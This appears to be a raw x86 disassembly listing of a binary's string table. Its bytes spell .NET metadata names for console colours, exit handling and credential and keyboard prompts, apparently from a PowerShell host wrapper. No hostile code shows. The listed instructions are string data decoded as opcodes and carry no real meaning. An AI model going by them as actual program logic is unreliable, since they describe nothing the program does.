  408240:	67 72 6f             	addr16 jb 0x4082b2
  408243:	75 6e                	jne    0x4082b3
  408245:	64 43                	fs inc %ebx
  408247:	6f                   	outsl  %ds:(%esi),(%dx)
  408248:	6c                   	insb   (%dx),%es:(%edi)
  408249:	6f                   	outsl  %ds:(%esi),(%dx)
  40824a:	72 00                	jb     0x40824c
  40824c:	73 65                	jae    0x4082b3
  40824e:	74 5f                	je     0x4082af
  408250:	44                   	inc    %esp
  408251:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  408255:	46                   	inc    %esi
  408256:	6f                   	outsl  %ds:(%esi),(%dx)
  408257:	72 65                	jb     0x4082be
  408259:	67 72 6f             	addr16 jb 0x4082cb
  40825c:	75 6e                	jne    0x4082cc
  40825e:	64 43                	fs inc %ebx
  408260:	6f                   	outsl  %ds:(%esi),(%dx)
  408261:	6c                   	insb   (%dx),%es:(%edi)
  408262:	6f                   	outsl  %ds:(%esi),(%dx)
  408263:	72 00                	jb     0x408265
  408265:	67 65 74 5f          	addr16 gs je 0x4082c8
  408269:	44                   	inc    %esp
  40826a:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40826e:	42                   	inc    %edx
  40826f:	61                   	popa
  408270:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  408273:	72 6f                	jb     0x4082e4
  408275:	75 6e                	jne    0x4082e5
  408277:	64 43                	fs inc %ebx
  408279:	6f                   	outsl  %ds:(%esi),(%dx)
  40827a:	6c                   	insb   (%dx),%es:(%edi)
  40827b:	6f                   	outsl  %ds:(%esi),(%dx)
  40827c:	72 00                	jb     0x40827e
  40827e:	73 65                	jae    0x4082e5
  408280:	74 5f                	je     0x4082e1
  408282:	44                   	inc    %esp
  408283:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  408287:	42                   	inc    %edx
  408288:	61                   	popa
  408289:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  40828c:	72 6f                	jb     0x4082fd
  40828e:	75 6e                	jne    0x4082fe
  408290:	64 43                	fs inc %ebx
  408292:	6f                   	outsl  %ds:(%esi),(%dx)
  408293:	6c                   	insb   (%dx),%es:(%edi)
  408294:	6f                   	outsl  %ds:(%esi),(%dx)
  408295:	72 00                	jb     0x408297
  408297:	67 65 74 5f          	addr16 gs je 0x4082fa
  40829b:	56                   	push   %esi
  40829c:	65 72 62             	gs jb  0x408301
  40829f:	6f                   	outsl  %ds:(%esi),(%dx)
  4082a0:	73 65                	jae    0x408307
  4082a2:	46                   	inc    %esi
  4082a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4082a4:	72 65                	jb     0x40830b
  4082a6:	67 72 6f             	addr16 jb 0x408318
  4082a9:	75 6e                	jne    0x408319
  4082ab:	64 43                	fs inc %ebx
  4082ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4082ae:	6c                   	insb   (%dx),%es:(%edi)
  4082af:	6f                   	outsl  %ds:(%esi),(%dx)
  4082b0:	72 00                	jb     0x4082b2
  4082b2:	73 65                	jae    0x408319
  4082b4:	74 5f                	je     0x408315
  4082b6:	56                   	push   %esi
  4082b7:	65 72 62             	gs jb  0x40831c
  4082ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4082bb:	73 65                	jae    0x408322
  4082bd:	46                   	inc    %esi
  4082be:	6f                   	outsl  %ds:(%esi),(%dx)
  4082bf:	72 65                	jb     0x408326
  4082c1:	67 72 6f             	addr16 jb 0x408333
  4082c4:	75 6e                	jne    0x408334
  4082c6:	64 43                	fs inc %ebx
  4082c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4082c9:	6c                   	insb   (%dx),%es:(%edi)
  4082ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4082cb:	72 00                	jb     0x4082cd
  4082cd:	67 65 74 5f          	addr16 gs je 0x408330
  4082d1:	56                   	push   %esi
  4082d2:	65 72 62             	gs jb  0x408337
  4082d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4082d6:	73 65                	jae    0x40833d
  4082d8:	42                   	inc    %edx
  4082d9:	61                   	popa
  4082da:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  4082dd:	72 6f                	jb     0x40834e
  4082df:	75 6e                	jne    0x40834f
  4082e1:	64 43                	fs inc %ebx
  4082e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4082e4:	6c                   	insb   (%dx),%es:(%edi)
  4082e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4082e6:	72 00                	jb     0x4082e8
  4082e8:	73 65                	jae    0x40834f
  4082ea:	74 5f                	je     0x40834b
  4082ec:	56                   	push   %esi
  4082ed:	65 72 62             	gs jb  0x408352
  4082f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4082f1:	73 65                	jae    0x408358
  4082f3:	42                   	inc    %edx
  4082f4:	61                   	popa
  4082f5:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  4082f8:	72 6f                	jb     0x408369
  4082fa:	75 6e                	jne    0x40836a
  4082fc:	64 43                	fs inc %ebx
  4082fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4082ff:	6c                   	insb   (%dx),%es:(%edi)
  408300:	6f                   	outsl  %ds:(%esi),(%dx)
  408301:	72 00                	jb     0x408303
  408303:	67 65 74 5f          	addr16 gs je 0x408366
  408307:	50                   	push   %eax
  408308:	72 6f                	jb     0x408379
  40830a:	67 72 65             	addr16 jb 0x408372
  40830d:	73 73                	jae    0x408382
  40830f:	46                   	inc    %esi
  408310:	6f                   	outsl  %ds:(%esi),(%dx)
  408311:	72 65                	jb     0x408378
  408313:	67 72 6f             	addr16 jb 0x408385
  408316:	75 6e                	jne    0x408386
  408318:	64 43                	fs inc %ebx
  40831a:	6f                   	outsl  %ds:(%esi),(%dx)
  40831b:	6c                   	insb   (%dx),%es:(%edi)
  40831c:	6f                   	outsl  %ds:(%esi),(%dx)
  40831d:	72 00                	jb     0x40831f
  40831f:	73 65                	jae    0x408386
  408321:	74 5f                	je     0x408382
  408323:	50                   	push   %eax
  408324:	72 6f                	jb     0x408395
  408326:	67 72 65             	addr16 jb 0x40838e
  408329:	73 73                	jae    0x40839e
  40832b:	46                   	inc    %esi
  40832c:	6f                   	outsl  %ds:(%esi),(%dx)
  40832d:	72 65                	jb     0x408394
  40832f:	67 72 6f             	addr16 jb 0x4083a1
  408332:	75 6e                	jne    0x4083a2
  408334:	64 43                	fs inc %ebx
  408336:	6f                   	outsl  %ds:(%esi),(%dx)
  408337:	6c                   	insb   (%dx),%es:(%edi)
  408338:	6f                   	outsl  %ds:(%esi),(%dx)
  408339:	72 00                	jb     0x40833b
  40833b:	67 65 74 5f          	addr16 gs je 0x40839e
  40833f:	50                   	push   %eax
  408340:	72 6f                	jb     0x4083b1
  408342:	67 72 65             	addr16 jb 0x4083aa
  408345:	73 73                	jae    0x4083ba
  408347:	42                   	inc    %edx
  408348:	61                   	popa
  408349:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  40834c:	72 6f                	jb     0x4083bd
  40834e:	75 6e                	jne    0x4083be
  408350:	64 43                	fs inc %ebx
  408352:	6f                   	outsl  %ds:(%esi),(%dx)
  408353:	6c                   	insb   (%dx),%es:(%edi)
  408354:	6f                   	outsl  %ds:(%esi),(%dx)
  408355:	72 00                	jb     0x408357
  408357:	73 65                	jae    0x4083be
  408359:	74 5f                	je     0x4083ba
  40835b:	50                   	push   %eax
  40835c:	72 6f                	jb     0x4083cd
  40835e:	67 72 65             	addr16 jb 0x4083c6
  408361:	73 73                	jae    0x4083d6
  408363:	42                   	inc    %edx
  408364:	61                   	popa
  408365:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  408368:	72 6f                	jb     0x4083d9
  40836a:	75 6e                	jne    0x4083da
  40836c:	64 43                	fs inc %ebx
  40836e:	6f                   	outsl  %ds:(%esi),(%dx)
  40836f:	6c                   	insb   (%dx),%es:(%edi)
  408370:	6f                   	outsl  %ds:(%esi),(%dx)
  408371:	72 00                	jb     0x408373
  408373:	67 65 74 5f          	addr16 gs je 0x4083d6
  408377:	53                   	push   %ebx
  408378:	68 6f 75 6c 64       	push   $0x646c756f
  40837d:	45                   	inc    %ebp
  40837e:	78 69                	js     0x4083e9
  408380:	74 00                	je     0x408382
  408382:	73 65                	jae    0x4083e9
  408384:	74 5f                	je     0x4083e5
  408386:	53                   	push   %ebx
  408387:	68 6f 75 6c 64       	push   $0x646c756f
  40838c:	45                   	inc    %ebp
  40838d:	78 69                	js     0x4083f8
  40838f:	74 00                	je     0x408391
  408391:	67 65 74 5f          	addr16 gs je 0x4083f4
  408395:	45                   	inc    %ebp
  408396:	78 69                	js     0x408401
  408398:	74 43                	je     0x4083dd
  40839a:	6f                   	outsl  %ds:(%esi),(%dx)
  40839b:	64 65 00 73 65       	fs add %dh,%gs:0x65(%ebx)
  4083a0:	74 5f                	je     0x408401
  4083a2:	45                   	inc    %ebp
  4083a3:	78 69                	js     0x40840e
  4083a5:	74 43                	je     0x4083ea
  4083a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4083a8:	64 65 00 53 68       	fs add %dl,%gs:0x68(%ebx)
  4083ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4083ae:	75 6c                	jne    0x40841c
  4083b0:	64 45                	fs inc %ebp
  4083b2:	78 69                	js     0x40841d
  4083b4:	74 00                	je     0x4083b6
  4083b6:	45                   	inc    %ebp
  4083b7:	78 69                	js     0x408422
  4083b9:	74 43                	je     0x4083fe
  4083bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4083bc:	64 65 00 73 68       	fs add %dh,%gs:0x68(%ebx)
  4083c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4083c2:	75 6c                	jne    0x408430
  4083c4:	64 45                	fs inc %ebp
  4083c6:	78 69                	js     0x408431
  4083c8:	74 00                	je     0x4083ca
  4083ca:	65 78 69             	gs js  0x408436
  4083cd:	74 43                	je     0x408412
  4083cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4083d0:	64 65 00 4d 61       	fs add %cl,%gs:0x61(%ebp)
  4083d5:	69 6e 00 55 6e 68 61 	imul   $0x61686e55,0x0(%esi),%ebp
  4083dc:	6e                   	outsb  %ds:(%esi),(%dx)
  4083dd:	64 6c                	fs insb (%dx),%es:(%edi)
  4083df:	65 64 45             	gs fs inc %ebp
  4083e2:	78 63                	js     0x408447
  4083e4:	65 70 74             	gs jo  0x40845b
  4083e7:	69 6f 6e 45 76 65 6e 	imul   $0x6e657645,0x6e(%edi),%ebp
  4083ee:	74 41                	je     0x408431
  4083f0:	72 67                	jb     0x408459
  4083f2:	73 00                	jae    0x4083f4
  4083f4:	43                   	inc    %ebx
  4083f5:	75 72                	jne    0x408469
  4083f7:	72 65                	jb     0x40845e
  4083f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4083fa:	74 44                	je     0x408440
  4083fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4083fd:	6d                   	insl   (%dx),%es:(%edi)
  4083fe:	61                   	popa
  4083ff:	69 6e 5f 55 6e 68 61 	imul   $0x61686e55,0x5f(%esi),%ebp
  408406:	6e                   	outsb  %ds:(%esi),(%dx)
  408407:	64 6c                	fs insb (%dx),%es:(%edi)
  408409:	65 64 45             	gs fs inc %ebp
  40840c:	78 63                	js     0x408471
  40840e:	65 70 74             	gs jo  0x408485
  408411:	69 6f 6e 00 63 72 65 	imul   $0x65726300,0x6e(%edi),%ebp
  408418:	64 69 6e 66 6f 00 74 	imul   $0x6174006f,%fs:0x66(%esi),%ebp
  40841f:	61 
  408420:	72 67                	jb     0x408489
  408422:	65 74 4e             	gs je  0x408473
  408425:	61                   	popa
  408426:	6d                   	insl   (%dx),%es:(%edi)
  408427:	65 00 72 65          	add    %dh,%gs:0x65(%edx)
  40842b:	73 65                	jae    0x408492
  40842d:	72 76                	jb     0x4084a5
  40842f:	65 64 31 00          	gs xor %eax,%fs:(%eax)
  408433:	69 45 72 72 6f 72 00 	imul   $0x726f72,0x72(%ebp),%eax
  40843a:	75 73                	jne    0x4084af
  40843c:	65 72 4e             	gs jb  0x40848d
  40843f:	61                   	popa
  408440:	6d                   	insl   (%dx),%es:(%edi)
  408441:	65 00 6d 61          	add    %ch,%gs:0x61(%ebp)
  408445:	78 55                	js     0x40849c
  408447:	73 65                	jae    0x4084ae
  408449:	72 4e                	jb     0x408499
  40844b:	61                   	popa
  40844c:	6d                   	insl   (%dx),%es:(%edi)
  40844d:	65 00 70 61          	add    %dh,%gs:0x61(%eax)
  408451:	73 73                	jae    0x4084c6
  408453:	77 6f                	ja     0x4084c4
  408455:	72 64                	jb     0x4084bb
  408457:	00 6d 61             	add    %ch,0x61(%ebp)
  40845a:	78 50                	js     0x4084ac
  40845c:	61                   	popa
  40845d:	73 73                	jae    0x4084d2
  40845f:	77 6f                	ja     0x4084d0
  408461:	72 64                	jb     0x4084c7
  408463:	00 70 66             	add    %dh,0x66(%eax)
  408466:	53                   	push   %ebx
  408467:	61                   	popa
  408468:	76 65                	jbe    0x4084cf
  40846a:	00 53 79             	add    %dl,0x79(%ebx)
  40846d:	73 74                	jae    0x4084e3
  40846f:	65 6d                	gs insl (%dx),%es:(%edi)
  408471:	2e 52                	cs push %edx
  408473:	75 6e                	jne    0x4084e3
  408475:	74 69                	je     0x4084e0
  408477:	6d                   	insl   (%dx),%es:(%edi)
  408478:	65 2e 49             	gs cs dec %ecx
  40847b:	6e                   	outsb  %ds:(%esi),(%dx)
  40847c:	74 65                	je     0x4084e3
  40847e:	72 6f                	jb     0x4084ef
  408480:	70 53                	jo     0x4084d5
  408482:	65 72 76             	gs jb  0x4084fb
  408485:	69 63 65 73 00 4d 61 	imul   $0x614d0073,0x65(%ebx),%esp
  40848c:	72 73                	jb     0x408501
  40848e:	68 61 6c 41 73       	push   $0x73416c61
  408493:	41                   	inc    %ecx
  408494:	74 74                	je     0x40850a
  408496:	72 69                	jb     0x408501
  408498:	62 75 74             	bound  %esi,0x74(%ebp)
  40849b:	65 00 55 6e          	add    %dl,%gs:0x6e(%ebp)
  40849f:	6d                   	insl   (%dx),%es:(%edi)
  4084a0:	61                   	popa
  4084a1:	6e                   	outsb  %ds:(%esi),(%dx)
  4084a2:	61                   	popa
  4084a3:	67 65 64 54          	addr16 gs fs push %esp
  4084a7:	79 70                	jns    0x408519
  4084a9:	65 00 66 6c          	add    %ah,%gs:0x6c(%esi)
  4084ad:	61                   	popa
  4084ae:	67 73 00             	addr16 jae 0x4084b1
  4084b1:	63 61 70             	arpl   %esp,0x70(%ecx)
  4084b4:	74 69                	je     0x40851f
  4084b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4084b7:	6e                   	outsb  %ds:(%esi),(%dx)
  4084b8:	00 6d 65             	add    %ch,0x65(%ebp)
  4084bb:	73 73                	jae    0x408530
  4084bd:	61                   	popa
  4084be:	67 65 00 74 61       	add    %dh,%gs:0x61(%si)
  4084c3:	72 67                	jb     0x40852c
  4084c5:	65 74 00             	gs je  0x4084c8
  4084c8:	75 73                	jne    0x40853d
  4084ca:	65 72 00             	gs jb  0x4084cd
  4084cd:	63 72 65             	arpl   %esi,0x65(%edx)
  4084d0:	64 54                	fs push %esp
  4084d2:	79 70                	jns    0x408544
  4084d4:	65 73 00             	gs jae 0x4084d7
  4084d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4084d8:	70 74                	jo     0x40854e
  4084da:	69 6f 6e 73 00 76 61 	imul   $0x61760073,0x6e(%edi),%ebp
  4084e1:	6c                   	insb   (%dx),%es:(%edi)
  4084e2:	75 65                	jne    0x408549
  4084e4:	00 72 65             	add    %dh,0x65(%edx)
  4084e7:	63 74 61 6e          	arpl   %esi,0x6e(%ecx,%eiz,2)
  4084eb:	67 6c                	insb   (%dx),%es:(%di)
  4084ed:	65 00 73 6f          	add    %dh,%gs:0x6f(%ebx)
  4084f1:	75 72                	jne    0x408565
  4084f3:	63 65 00             	arpl   %esp,0x0(%ebp)
  4084f6:	64 65 73 74          	fs gs jae 0x40856e
  4084fa:	69 6e 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%esi),%ebp
  408501:	00 63 6c             	add    %ah,0x6c(%ebx)
  408504:	69 70 00 66 69 6c 6c 	imul   $0x6c6c6966,0x0(%eax),%esi
  40850b:	00 6f 72             	add    %ch,0x72(%edi)
  40850e:	69 67 69 6e 00 63 6f 	imul   $0x6f63006e,0x69(%edi),%esp
  408515:	6e                   	outsb  %ds:(%esi),(%dx)
  408516:	74 65                	je     0x40857d
  408518:	6e                   	outsb  %ds:(%esi),(%dx)
  408519:	74 73                	je     0x40858e
  40851b:	00 73 74             	add    %dh,0x74(%ebx)
  40851e:	72 49                	jb     0x408569
  408520:	64 00 73 74          	add    %dh,%fs:0x74(%ebx)
  408524:	72 54                	jb     0x40857a
  408526:	69 74 6c 65 00 73 74 	imul   $0x72747300,0x65(%esp,%ebp,2),%esi
  40852d:	72 
  40852e:	50                   	push   %eax
  40852f:	72 6f                	jb     0x4085a0
  408531:	6d                   	insl   (%dx),%es:(%edi)
  408532:	70 74                	jo     0x4085a8
  408534:	00 73 74             	add    %dh,0x74(%ebx)
  408537:	72 56                	jb     0x40858f
  408539:	61                   	popa
  40853a:	6c                   	insb   (%dx),%es:(%edi)
  40853b:	00 62 6c             	add    %ah,0x6c(%edx)
  40853e:	53                   	push   %ebx
  40853f:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408543:	65 00 61 72          	add    %ah,%gs:0x72(%ecx)
  408547:	72 43                	jb     0x40858c
  408549:	68 6f 69 63 65       	push   $0x6563696f
  40854e:	00 69 6e             	add    %ch,0x6e(%ecx)
  408551:	74 44                	je     0x408597
  408553:	65 66 61             	gs popaw
  408556:	75 6c                	jne    0x4085c4
  408558:	74 00                	je     0x40855a
  40855a:	77 56                	ja     0x4085b2
  40855c:	69 72 74 4b 65 79 00 	imul   $0x79654b,0x74(%edx),%esi
  408563:	77 53                	ja     0x4085b8
  408565:	63 61 6e             	arpl   %esp,0x6e(%ecx)
  408568:	43                   	inc    %ebx
  408569:	6f                   	outsl  %ds:(%esi),(%dx)
  40856a:	64 65 00 6c 70 4b    	fs add %ch,%gs:0x4b(%eax,%esi,2)
  408570:	65 79 53             	gs jns 0x4085c6
  408573:	74 61                	je     0x4085d6
  408575:	74 65                	je     0x4085dc
  408577:	00 70 77             	add    %dh,0x77(%eax)
  40857a:	73 7a                	jae    0x4085f6
  40857c:	42                   	inc    %edx
  40857d:	75 66                	jne    0x4085e5
  40857f:	66 00 4f 75          	data16 add %cl,0x75(%edi)
  408583:	74 41                	je     0x4085c6
  408585:	74 74                	je     0x4085fb
  408587:	72 69                	jb     0x4085f2
  408589:	62 75 74             	bound  %esi,0x74(%ebp)
  40858c:	65 00 63 63          	add    %ah,%gs:0x63(%ebx)
  408590:	68 42 75 66 66       	push   $0x66667542
  408595:	00 77 46             	add    %dh,0x46(%edi)
  408598:	6c                   	insb   (%dx),%es:(%edi)
  408599:	61                   	popa
  40859a:	67 73 00             	addr16 jae 0x40859d
  40859d:	6b 65 79 73          	imul   $0x73,0x79(%ebp),%esp
  4085a1:	00 62 6c             	add    %ah,0x6c(%edx)
  4085a4:	53                   	push   %ebx
  4085a5:	68 69 66 74 00       	push   $0x746669
  4085aa:	62 6c 41 6c          	bound  %ebp,0x6c(%ecx,%eax,2)
  4085ae:	74 47                	je     0x4085f7
  4085b0:	72 00                	jb     0x4085b2
  4085b2:	62 6c 49 6e          	bound  %ebp,0x6e(%ecx,%ecx,2)
  4085b6:	63 6c 75 64          	arpl   %ebp,0x64(%ebp,%esi,2)
  4085ba:	65 4b                	gs dec %ebx
  4085bc:	65 79 44             	gs jns 0x408603
  4085bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4085c0:	77 6e                	ja     0x408630
  4085c2:	00 73 65             	add    %dh,0x65(%ebx)
  4085c5:	6e                   	outsb  %ds:(%esi),(%dx)
  4085c6:	64 65 72 00          	fs gs jb 0x4085ca
  4085ca:	65 00 63 6f          	add    %ah,%gs:0x6f(%ebx)
  4085ce:	6c                   	insb   (%dx),%es:(%edi)
  4085cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4085d0:	72 00                	jb     0x4085d2
  4085d2:	70 64                	jo     0x408638
  4085d4:	00 70 6f             	add    %dh,0x6f(%eax)
  4085d7:	73 69                	jae    0x408642
  4085d9:	74 69                	je     0x408644
  4085db:	6f                   	outsl  %ds:(%esi),(%dx)
  4085dc:	6e                   	outsb  %ds:(%esi),(%dx)
  4085dd:	00 42 61             	add    %al,0x61(%edx)
  4085e0:	72 43                	jb     0x408625
  4085e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4085e3:	6c                   	insb   (%dx),%es:(%edi)
  4085e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4085e5:	72 00                	jb     0x4085e7
  4085e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4085e8:	62 6a 52             	bound  %ebp,0x52(%edx)
  4085eb:	65 63 6f 72          	arpl   %ebp,%gs:0x72(%edi)
  4085ef:	64 00 73 74          	add    %dh,%fs:0x74(%ebx)
  4085f3:	64 48                	fs dec %eax
  4085f5:	61                   	popa
  4085f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4085f7:	64 6c                	fs insb (%dx),%es:(%edi)
  4085f9:	65 00 68 46          	add    %ch,%gs:0x46(%eax)
  4085fd:	69 6c 65 00 64 65 73 	imul   $0x63736564,0x0(%ebp,%eiz,2),%ebp
  408604:	63 
  408605:	72 69                	jb     0x408670
  408607:	70 74                	jo     0x40867d
  408609:	69 6f 6e 73 00 63 68 	imul   $0x68630073,0x6e(%edi),%ebp
  408610:	6f                   	outsl  %ds:(%esi),(%dx)
  408611:	69 63 65 73 00 64 65 	imul   $0x65640073,0x65(%ebx),%esp
  408618:	66 61                	popaw
  40861a:	75 6c                	jne    0x408688
  40861c:	74 43                	je     0x408661
  40861e:	68 6f 69 63 65       	push   $0x6563696f
  408623:	00 61 6c             	add    %ah,0x6c(%ecx)
  408626:	6c                   	insb   (%dx),%es:(%edi)
  408627:	6f                   	outsl  %ds:(%esi),(%dx)
  408628:	77 65                	ja     0x40868f
  40862a:	64 43                	fs inc %ebx
  40862c:	72 65                	jb     0x408693
  40862e:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408631:	74 69                	je     0x40869c
  408633:	61                   	popa
  408634:	6c                   	insb   (%dx),%es:(%edi)
  408635:	54                   	push   %esp
  408636:	79 70                	jns    0x4086a8
  408638:	65 73 00             	gs jae 0x40863b
  40863b:	66 6f                	outsw  %ds:(%esi),(%dx)
  40863d:	72 65                	jb     0x4086a4
  40863f:	67 72 6f             	addr16 jb 0x4086b1
  408642:	75 6e                	jne    0x4086b2
  408644:	64 43                	fs inc %ebx
  408646:	6f                   	outsl  %ds:(%esi),(%dx)
  408647:	6c                   	insb   (%dx),%es:(%edi)
  408648:	6f                   	outsl  %ds:(%esi),(%dx)
  408649:	72 00                	jb     0x40864b
  40864b:	62 61 63             	bound  %esp,0x63(%ecx)
  40864e:	6b 67 72 6f          	imul   $0x6f,0x72(%edi),%esp
  408652:	75 6e                	jne    0x4086c2
  408654:	64 43                	fs inc %ebx
  408656:	6f                   	outsl  %ds:(%esi),(%dx)
  408657:	6c                   	insb   (%dx),%es:(%edi)
  408658:	6f                   	outsl  %ds:(%esi),(%dx)
  408659:	72 00                	jb     0x40865b
  40865b:	73 6f                	jae    0x4086cc
  40865d:	75 72                	jne    0x4086d1
  40865f:	63 65 49             	arpl   %esp,0x49(%ebp)
  408662:	64 00 72 65          	add    %dh,%fs:0x65(%edx)
  408666:	63 6f 72             	arpl   %ebp,0x72(%edi)
  408669:	64 00 61 70          	add    %ah,%fs:0x70(%ecx)
  40866d:	70 00                	jo     0x40866f
  40866f:	61                   	popa
  408670:	72 67                	jb     0x4086d9
  408672:	73 00                	jae    0x408674
  408674:	53                   	push   %ebx
  408675:	79 73                	jns    0x4086ea
  408677:	74 65                	je     0x4086de
  408679:	6d                   	insl   (%dx),%es:(%edi)
  40867a:	2e 52                	cs push %edx
  40867c:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  40867f:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408684:	6e                   	outsb  %ds:(%esi),(%dx)
  408685:	00 41 73             	add    %al,0x73(%ecx)
  408688:	73 65                	jae    0x4086ef
  40868a:	6d                   	insl   (%dx),%es:(%edi)
  40868b:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  40868f:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  408696:	72 
  408697:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  40869e:	73 73                	jae    0x408713
  4086a0:	65 6d                	gs insl (%dx),%es:(%edi)
  4086a2:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  4086a6:	72 6f                	jb     0x408717
  4086a8:	64 75 63             	fs jne 0x40870e
  4086ab:	74 41                	je     0x4086ee
  4086ad:	74 74                	je     0x408723
  4086af:	72 69                	jb     0x40871a
  4086b1:	62 75 74             	bound  %esi,0x74(%ebp)
  4086b4:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4086b8:	73 65                	jae    0x40871f
  4086ba:	6d                   	insl   (%dx),%es:(%edi)
  4086bb:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4086bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4086c0:	70 79                	jo     0x40873b
  4086c2:	72 69                	jb     0x40872d
  4086c4:	67 68 74 41 74 74    	addr16 push $0x74744174
  4086ca:	72 69                	jb     0x408735
  4086cc:	62 75 74             	bound  %esi,0x74(%ebp)
  4086cf:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4086d3:	73 65                	jae    0x40873a
  4086d5:	6d                   	insl   (%dx),%es:(%edi)
  4086d6:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  4086da:	72 61                	jb     0x40873d
  4086dc:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  4086df:	61                   	popa
  4086e0:	72 6b                	jb     0x40874d
  4086e2:	41                   	inc    %ecx
  4086e3:	74 74                	je     0x408759
  4086e5:	72 69                	jb     0x408750
  4086e7:	62 75 74             	bound  %esi,0x74(%ebp)
  4086ea:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4086ee:	73 65                	jae    0x408755
  4086f0:	6d                   	insl   (%dx),%es:(%edi)
  4086f1:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  4086f5:	65 73 63             	gs jae 0x40875b
  4086f8:	72 69                	jb     0x408763
  4086fa:	70 74                	jo     0x408770
  4086fc:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  408703:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  40870a:	73 73                	jae    0x40877f
  40870c:	65 6d                	gs insl (%dx),%es:(%edi)
  40870e:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408712:	6f                   	outsl  %ds:(%esi),(%dx)
  408713:	6d                   	insl   (%dx),%es:(%edi)
  408714:	70 61                	jo     0x408777
  408716:	6e                   	outsb  %ds:(%esi),(%dx)
  408717:	79 41                	jns    0x40875a
  408719:	74 74                	je     0x40878f
  40871b:	72 69                	jb     0x408786
  40871d:	62 75 74             	bound  %esi,0x74(%ebp)
  408720:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  408724:	73 74                	jae    0x40879a
  408726:	65 6d                	gs insl (%dx),%es:(%edi)
  408728:	2e 52                	cs push %edx
  40872a:	75 6e                	jne    0x40879a
  40872c:	74 69                	je     0x408797
  40872e:	6d                   	insl   (%dx),%es:(%edi)
  40872f:	65 2e 43             	gs cs inc %ebx
  408732:	6f                   	outsl  %ds:(%esi),(%dx)
  408733:	6d                   	insl   (%dx),%es:(%edi)
  408734:	70 69                	jo     0x40879f
  408736:	6c                   	insb   (%dx),%es:(%edi)
  408737:	65 72 53             	gs jb  0x40878d
  40873a:	65 72 76             	gs jb  0x4087b3
  40873d:	69 63 65 73 00 43 6f 	imul   $0x6f430073,0x65(%ebx),%esp
  408744:	6d                   	insl   (%dx),%es:(%edi)
  408745:	70 69                	jo     0x4087b0
  408747:	6c                   	insb   (%dx),%es:(%edi)
  408748:	61                   	popa
  408749:	74 69                	je     0x4087b4
  40874b:	6f                   	outsl  %ds:(%esi),(%dx)
  40874c:	6e                   	outsb  %ds:(%esi),(%dx)
  40874d:	52                   	push   %edx
  40874e:	65 6c                	gs insb (%dx),%es:(%edi)
  408750:	61                   	popa
  408751:	78 61                	js     0x4087b4
  408753:	74 69                	je     0x4087be
  408755:	6f                   	outsl  %ds:(%esi),(%dx)
  408756:	6e                   	outsb  %ds:(%esi),(%dx)
  408757:	73 41                	jae    0x40879a
  408759:	74 74                	je     0x4087cf
  40875b:	72 69                	jb     0x4087c6
  40875d:	62 75 74             	bound  %esi,0x74(%ebp)
  408760:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408764:	6e                   	outsb  %ds:(%esi),(%dx)
  408765:	74 69                	je     0x4087d0
  408767:	6d                   	insl   (%dx),%es:(%edi)
  408768:	65 43                	gs inc %ebx
  40876a:	6f                   	outsl  %ds:(%esi),(%dx)
  40876b:	6d                   	insl   (%dx),%es:(%edi)
  40876c:	70 61                	jo     0x4087cf
  40876e:	74 69                	je     0x4087d9
  408770:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  408773:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  40877a:	69 
  40877b:	62 75 74             	bound  %esi,0x74(%ebp)
  40877e:	65 00 54 72 61       	add    %dl,%gs:0x61(%edx,%esi,2)
